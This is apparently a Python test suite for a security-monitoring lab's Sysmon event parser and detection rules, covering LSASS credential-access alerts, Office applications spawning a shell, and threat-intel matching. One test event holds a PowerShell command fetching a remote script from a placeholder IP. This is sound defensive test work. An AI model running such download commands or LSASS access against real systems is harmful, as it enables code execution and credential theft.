from __future__ import annotations

import json

from app.models.common import Severity
from app.models.events import EventSource, EventType
from app.parsers import ParseOptions
from app.parsers.windows import WindowsJsonParser
from tests.conftest import ev, rules_fired

SYSMON = "Microsoft-Windows-Sysmon/Operational"


def sysmon(event_id: int, **data):
    return {
        "EventID": event_id,
        "TimeCreated": "2026-10-30T14:00:00Z",
        "Computer": "WS-DEV-03.corp.lab",
        "Channel": SYSMON,
        "EventData": data,
    }


def parse(record):
    return WindowsJsonParser().parse(json.dumps([record]), ParseOptions()).events[0]


class TestSysmonParser:
    def test_process_create_with_hashes(self):
        e = parse(
            sysmon(
                1,
                Image="C:\\Tools\\x.exe",
                CommandLine="x.exe -a",
                ParentImage="C:\\Windows\\System32\\cmd.exe",
                User="CORP\\a.costa",
                Hashes="MD5=AA,SHA256=BBCC",
            )
        )
        assert (e.event_source, e.event_action, e.username, e.parent_process) == (
            EventSource.windows_sysmon,
            "process_created",
            "a.costa",
            "C:\\Windows\\System32\\cmd.exe",
        )
        assert e.fields["sha256"] == "bbcc" and e.fields["md5"] == "aa"

    def test_network_connection(self):
        e = parse(
            sysmon(
                3,
                Image="curl.exe",
                SourceIp="10.10.10.23",
                DestinationIp="198.51.100.9",
                DestinationPort="443",
                DestinationHostname="x.example",
            )
        )
        assert (e.event_type, e.destination_ip, e.destination_port, e.fields["destination_hostname"]) == (
            EventType.network,
            "198.51.100.9",
            443,
            "x.example",
        )

    def test_sysmon_ids_need_the_sysmon_channel(self):
        record = sysmon(1, Image="x.exe")
        record["Channel"] = "Security"
        assert WindowsJsonParser().parse(json.dumps([record]), ParseOptions()).skipped == 1


def lsass_access(source="C:\\Users\\Public\\svch.exe", access="0x1FFFFF"):
    return ev("process_access", source=EventSource.windows_sysmon, event_type=EventType.process, hostname="ws-dev-03", username="a.costa",
              process_name=source, fields={"target_image": "C:\\Windows\\system32\\lsass.exe", "granted_access": access})  # fmt: skip


def test_lsass_access_rule(engine):
    assert rules_fired(engine, [lsass_access()]) == ["LAB-015"]
    assert rules_fired(engine, [lsass_access(source="C:\\Program Files\\Defender\\MsMpEng.exe")]) == []
    assert rules_fired(engine, [lsass_access(access="0x1000")]) == []  # query-limited information only


def test_office_spawning_shell(engine):
    office = ev("process_created", event_type=EventType.process, hostname="ws-fin-01", username="j.silva",
                parent_process="C:\\Program Files\\Microsoft Office\\EXCEL.EXE", process_name="C:\\Windows\\System32\\cmd.exe")  # fmt: skip
    benign = ev("process_created", event_type=EventType.process, hostname="ws-fin-01", username="j.silva",
                parent_process="C:\\Windows\\explorer.exe", process_name="C:\\Windows\\System32\\cmd.exe")  # fmt: skip
    assert rules_fired(engine, [office, benign]) == ["LAB-017"]


def test_threat_intel_matches_ip_domain_url_and_hash(engine):
    events = [
        ev(
            "network_connection",
            source=EventSource.windows_sysmon,
            event_type=EventType.network,
            hostname="ws-1",
            destination_ip="198.51.100.66",
        ),
        ev(
            "dns_query",
            source=EventSource.windows_sysmon,
            event_type=EventType.network,
            hostname="ws-2",
            fields={"query_name": "CDN-TELEMETRY-UPDATE.example"},
        ),
        ev("process_created", event_type=EventType.process, hostname="ws-3", command_line="iwr http://203.0.113.80/a.ps1"),
        ev(
            "process_created",
            event_type=EventType.process,
            hostname="ws-4",
            fields={"sha256": "77d4b7dd3207708cad149e53495028210de3f2ba482f460b0c8e55b4b47bbfdd"},
        ),
        ev(
            "network_connection", source=EventSource.windows_sysmon, event_type=EventType.network, hostname="ws-5", destination_ip="8.8.8.8"
        ),
    ]
    alerts = [a for a in engine.run(events) if a.rule_id == "LAB-016"]
    assert sorted(a.hostname for a in alerts) == ["ws-1", "ws-2", "ws-3", "ws-4"]
    assert {a.hostname: a.severity for a in alerts}["ws-3"] == Severity.high  # severity comes from the indicator


def test_threat_intel_endpoint(client):
    feed = client.get("/api/threat-intel").json()
    assert feed["indicators"] and {"ip", "domain", "sha256"} <= {i["type"] for i in feed["indicators"]}
